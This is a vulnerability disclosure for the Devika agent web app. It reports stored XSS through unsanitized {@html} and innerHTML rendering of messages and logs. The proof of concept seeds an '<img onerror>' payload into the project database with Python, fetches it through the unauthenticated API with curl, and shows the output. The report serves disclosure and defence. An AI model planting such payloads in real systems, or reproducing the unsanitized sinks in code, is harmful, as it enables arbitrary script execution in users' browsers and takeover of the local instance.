# Devika: stored XSS — messages and logs rendered unsanitized through {@html}

## Description

Two frontend rendering sinks bypass sanitization: `MessageContainer.svelte:62-73` renders messages via `bind:innerHTML`/`{@html}`, and the logs page `+page.svelte:46-58` renders logs via `{@html log}`. The project applies DOMPurify only to outbound composer input; the stored/inbound direction is entirely unsanitized. The backend `POST /api/messages` (devika.py:68-73) returns stored messages verbatim, so injected HTML round-trips unmodified.

## Impact

When web content processed by the agent or socket-submitted user messages carry markup such as `<img src=x onerror=...>`, it is stored verbatim and executes in the browser of anyone viewing that session or the logs — arbitrary JavaScript in the operator's browser context (which, combined with the unauthenticated API, allows full control of the local Devika instance).

## PoC

```bash
# 1. Seed: store a message containing the payload in a victim project
#    (writes Projects.message_stack_json — the same storage path the socket
#     'user-message' handler writes to)
python -c "
import sys, json; sys.path.insert(0, '.')
from sqlmodel import Session
from src.project import ProjectManager, Projects
mgr = ProjectManager()
with Session(mgr.engine) as s:
    row = Projects(project='xss-fresh-42',
                   message_stack_json=json.dumps([{'role':'user','message':'<img src=x onerror=alert(1)>'}]))
    s.add(row); s.commit()"

# 2. Fetch without authentication — payload returned verbatim:
curl -X POST http://127.0.0.1:1337/api/messages -H "Content-Type: application/json" \
  -d '{"project_name": "xss-fresh-42"}'
```

## Execution result

```
$ curl -X POST .../api/messages -d '{"project_name": "xss-fresh-42"}'
{"messages":[{"message":"<img src=x onerror=alert(1)>","role":"user"}]}
[HTTP 200]

Frontend sinks (code-verified):
  MessageContainer.svelte:62-73  bind:innerHTML / {@html}
  +page.svelte:46-58             {@html log}
  DOMPurify covers outbound composer input only, not stored/inbound rendering
```
